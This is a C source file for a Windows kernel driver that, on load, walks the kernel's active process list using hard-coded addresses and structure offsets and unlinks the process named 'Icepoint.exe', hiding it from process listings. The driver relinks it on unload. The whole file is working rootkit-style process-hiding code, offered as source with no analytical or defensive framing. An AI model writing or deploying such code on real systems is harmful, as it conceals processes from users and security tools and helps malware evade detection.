/*
 * This program is free software; you can redistribute it and/or modify it
 * under the terms and conditions of the GNU General Public License,
 * version 2, as published by the Free Software Foundation.
 *
 * This program is distributed in the hope it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 59 Temple
 * Place - Suite 330, Boston, MA 02111-1307 USA.
 *
 * Copyright (C) Superymk <superymkfounder@hotmail.com>
 */

#include "Chronosphere.h"

PLIST_ENTRY PsActiveProcessHead = (PLIST_ENTRY)0x80568558;  
PLIST_ENTRY icepoint_entry = NULL;

static void HideProcess(void);
NTSTATUS DriverUnload (
    PDRIVER_OBJECT DriverObject
)
{
	if(icepoint_entry)
		InsertTailList(PsActiveProcessHead, icepoint_entry);
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry (
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
)
{
	NTSTATUS status;
	PEPROCESS pep;
	HideProcess();

	DriverObject->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}

static void HideProcess(void) 
{ 
    PLIST_ENTRY List = PsActiveProcessHead->Blink; 
    while( List != PsActiveProcessHead ) 
    { 
        char* name = ((char*)List-0x88)+0x174;   
 DbgPrint("Process:%s \n",name); 	
        if ( !_stricmp(name,"Icepoint.exe") ) 
        { 
            DbgPrint("remove %s \n",name); 
			icepoint_entry = List;
            RemoveEntryList(List); 
			//List->Flink->Blink = List->Flink;
			break;
        } 
        List=List->Blink;               
    } 
}  